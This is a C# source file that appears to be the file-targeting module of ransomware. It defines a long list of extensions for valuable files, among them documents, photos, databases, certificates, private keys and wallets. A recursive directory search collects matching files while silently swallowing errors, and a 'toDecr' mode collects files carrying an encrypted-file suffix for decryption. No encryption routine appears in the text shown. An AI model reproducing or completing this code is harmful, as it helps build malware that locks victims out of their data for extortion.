using System;
using System.Collections.Generic;
using System.IO;

namespace Extension;

public static class FileHandler
{
	private static string validExtensions = ".3dm .3fr .3g2 .3gp .7z .aaf .accdb .aep .aepx .aet .ai .aif .apk .arch00 .arw .as .as3 .asf .asp .aspx .asset .asx .avi .bar .bay .bc6 .bc7 .big .bik .bkf .bkp .blob .bmp .bsa .cs .csproj .cas .cdr .cer .cfr .class .config .cpp .cr2 .crt .crw .cs .css .csv .d3dbsp .das .dazip .db .db0 .dba .dbf .dcr .der .desc .dmp .dng .doc .docb .docm .docx .dot .dotm .dotx .dwg .dxf .dxg .efx .epk .eps .erf .esm .ff .fla .flv .forge .fos .fpk .fsh .gdb .gho .hkdb .hkx .hplg .html .hvpl .ibank .icxs .idml .iff .indb .indd .indl .indt .inx .itdb .itl .itm .iwd .iwi .jar .java .jpe .jpeg .jpg .js .kdb .kdc .kf .layout .lbf .litemod .lrf .ltx .lvl .m2 .m3u .m3u8 .m4a .m4u .map .max .mcmeta .mdb .mdbackup .mddata .mdf .mef .menu .mid .mlx .mov .mp3 .mp4 .mpa .mpeg .mpg .mpqge .mrw .mrwref .msg .ncf .nef .nrw .ntl .odb .odc .odm .odp .ods .odt .orf .p12 .p7b .p7c .pak .pdb .pdd .pdf .pef .pem .pfx .php .pk7 .pkpass .plb .pmd .png .pot .potm .potx .ppam .ppj .pps .ppsm .ppsx .ppt .pptm .pptx .prel .prproj .ps .psd .psk .pst .ptx .py .qdf .qic .r3d .ra .raf .rar .raw .rb .re4 .rgss3a .rim .rofl .rtf .resx .rw2 .rwl .sav .sb .sdf .settings .sid .sidd .sidn .sie .sis .sldm .sldx .slm .sln .snx .sql .sr2 .srf .srw .sum .svg .swf .syncdb .t12 .t13 .tax .tif .tor .txt .upk .vcf .vdf .vfs0 .vob .vpk .vpp_pc .vtf .w3x .wallet .wav .wb2 .wma .wmo .wmv .wotreplay .wpd .wps .x3f .xf .xla .xlam .xlk .xll .xlm .xls .xlsb .xlsm .xlsx .xlt .xltm .xltx .xlw .xml .xqx .xxx .zip .ztmp " + Config.EncryptedFileSuffix;

	private static string skipDirs = ".nuget packages node_modules cache caches temp";

	private static List<string> fileIndex;

	public static List<string> DirSearch(string sDir, bool toDecr, List<string> sOld = null)
	{
		if (sOld == null)
		{
			fileIndex = new List<string>();
		}
		else
		{
			fileIndex = sOld;
		}
		try
		{
			try
			{
				string[] files = Directory.GetFiles(sDir);
				foreach (string text in files)
				{
					try
					{
						string value = Path.GetExtension(text)!.Trim().ToLower();
						if (toDecr)
						{
							if (Config.EncryptedFileSuffix.Contains(value) && !string.IsNullOrEmpty(value))
							{
								fileIndex.Add(text);
							}
						}
						else if (validExtensions.Contains(value) && !string.IsNullOrEmpty(value))
						{
							fileIndex.Add(text);
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
			try
			{
				string[] files = Directory.GetDirectories(sDir);
				foreach (string text2 in files)
				{
					try
					{
						string value2 = new DirectoryInfo(text2).Name.ToLower();
						if (!skipDirs.Contains(value2))
						{
							DirSearch(text2, toDecr, fileIndex);
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
		catch (Exception)
		{
		}
		return fileIndex;
	}
}
